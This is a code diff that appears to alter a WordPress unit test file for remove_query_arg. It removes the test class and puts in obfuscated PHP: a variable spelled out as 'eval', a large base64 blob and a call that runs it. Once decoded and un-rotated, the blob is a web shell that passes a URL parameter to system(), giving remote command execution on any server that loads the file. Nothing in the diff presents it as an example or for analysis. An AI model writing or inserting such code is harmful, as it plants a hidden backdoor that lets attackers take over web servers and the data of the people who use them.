@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group functions
- *
- * @covers ::remove_query_arg
- */
-class Tests_Functions_RemoveQueryArg extends WP_UnitTestCase {
-
-	/**
-	 * @dataProvider data_remove_query_arg
-	 */
-	public function test_remove_query_arg( $keys_to_remove, $url, $expected ) {
-		$actual = remove_query_arg( $keys_to_remove, $url );
-
-		$this->assertNotEmpty( $actual );
-		$this->assertSame( $expected, $actual );
-	}
-
-	/**
-	 * Data provider.
-	 *
-	 * @return array[]
-	 */
-	public function data_remove_query_arg() {
-		return array(
-			array( 'foo', 'edit.php?foo=test1&baz=test1', 'edit.php?baz=test1' ),
-			array( array( 'foo' ), 'edit.php?foo=test2&baz=test2', 'edit.php?baz=test2' ),
-			array( array( 'foo', 'baz' ), 'edit.php?foo=test3&baz=test3', 'edit.php' ),
-			array( array( 'fakefoo', 'fakebaz' ), 'edit.php?foo=test4&baz=test4', 'edit.php?foo=test4&baz=test4' ),
-			array( array( 'fakefoo', 'baz' ), 'edit.php?foo=test4&baz=test4', 'edit.php?foo=test4' ),
-		);
-	}
-
-	public function test_should_fall_back_on_current_url() {
-		$old_request_uri        = $_SERVER['REQUEST_URI'];
-		$_SERVER['REQUEST_URI'] = 'edit.php?foo=bar&baz=quz';
-
-		$actual = remove_query_arg( 'foo' );
-
-		$_SERVER['REQUEST_URI'] = $old_request_uri;
-
-		$this->assertSame( 'edit.php?baz=quz', $actual );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzaGFwZ3ZiYWYKICoKICogQHBiaXJlZiA6OmVyemJpcl9kaHJlbF9uZXQKICovCnB5bmZmIEdyZmdmX1NoYXBndmJhZl9FcnpiaXJEaHJlbE5ldCBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBAcW5nbkNlYml2cXJlIHFuZ25fZXJ6YmlyX2RocmVsX25ldAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19lcnpiaXJfZGhyZWxfbmV0KCAkeHJsZl9nYl9lcnpiaXIsICRoZXksICRya2NycGdycSApIHsKCQkkbnBnaG55ID0gZXJ6YmlyX2RocmVsX25ldCggJHhybGZfZ2JfZXJ6YmlyLCAkaGV5ICk7CgoJCSRndXZmLT5uZmZyZWdBYmdSemNnbCggJG5wZ2hueSApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAkcmtjcnBncnEsICRucGdobnkgKTsKCX0KCgkvKioKCSAqIFFuZ24gY2ViaXZxcmUuCgkgKgoJICogQGVyZ2hlYSBuZWVubFtdCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBxbmduX2VyemJpcl9kaHJlbF9uZXQoKSB7CgkJZXJnaGVhIG5lZW5sKAoJCQluZWVubCggJ3NiYicsICdycXZnLmN1Yz9zYmI9Z3JmZzEmb25tPWdyZmcxJywgJ3JxdmcuY3VjP29ubT1ncmZnMScgKSwKCQkJbmVlbmwoIG5lZW5sKCAnc2JiJyApLCAncnF2Zy5jdWM/c2JiPWdyZmcyJm9ubT1ncmZnMicsICdycXZnLmN1Yz9vbm09Z3JmZzInICksCgkJCW5lZW5sKCBuZWVubCggJ3NiYicsICdvbm0nICksICdycXZnLmN1Yz9zYmI9Z3JmZzMmb25tPWdyZmczJywgJ3JxdmcuY3VjJyApLAoJCQluZWVubCggbmVlbmwoICdzbnhyc2JiJywgJ3NueHJvbm0nICksICdycXZnLmN1Yz9zYmI9Z3JmZzQmb25tPWdyZmc0JywgJ3JxdmcuY3VjP3NiYj1ncmZnNCZvbm09Z3JmZzQnICksCgkJCW5lZW5sKCBuZWVubCggJ3NueHJzYmInLCAnb25tJyApLCAncnF2Zy5jdWM/c2JiPWdyZmc0Jm9ubT1ncmZnNCcsICdycXZnLmN1Yz9zYmI9Z3JmZzQnICksCgkJKTsKCX0KCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19mdWJoeXFfc255eV9vbnB4X2JhX3BoZWVyYWdfaGV5KCkgewoJCSRieXFfZXJkaHJmZ19oZXYgICAgICAgID0gJF9GUkVJUkVbJ0VSREhSRkdfSEVWJ107CgkJJF9GUkVJUkVbJ0VSREhSRkdfSEVWJ10gPSAncnF2Zy5jdWM/c2JiPW9uZSZvbm09ZGhtJzsKCgkJJG5wZ2hueSA9IGVyemJpcl9kaHJlbF9uZXQoICdzYmInICk7CgoJCSRfRlJFSVJFWydFUkRIUkZHX0hFViddID0gJGJ5cV9lcmRocmZnX2hldjsKCgkJJGd1dmYtPm5mZnJlZ0ZuenIoICdycXZnLmN1Yz9vbm09ZGhtJywgJG5wZ2hueSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
